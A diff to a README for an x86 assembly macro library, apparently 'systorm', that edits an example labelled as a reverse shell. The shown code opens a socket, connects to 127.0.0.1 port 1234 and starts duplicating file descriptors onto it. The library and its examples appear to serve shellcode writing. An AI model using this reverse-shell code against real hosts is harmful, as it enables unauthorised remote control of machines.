@@ -43,8 +43,10 @@ As is evident, systorm defines a number of macros that can be used to perform us
 
 Additionally, all syscalls (prefixed with "sys.") are set up as macros, so they do not need to be included like other functions.
 
-A simple reverse shell (179 bytes) is:
+A simple reverse shell (167 bytes) is:
 ```
+[BITS 32]
+
 %include "syscall.inc"
 %include "socket.inc"
 %include "utils.inc"
@@ -61,7 +63,7 @@ main:
 
     sock.socket AF_INET, SOCK_STREAM
     mov dword [ebp-4], eax
-    sock.connect dword [ebp-4], AF_INET, dword 0x0101017F, 0xD204	; 127.0.0.1, 1234s
+    sock.connect dword [ebp-4], AF_INET, 0x0101017F, 0xD204	; 127.0.0.1, 1234s
     mov ecx, 2
 .dup_loop:
     sys.dup2 [ebp-4], ecx
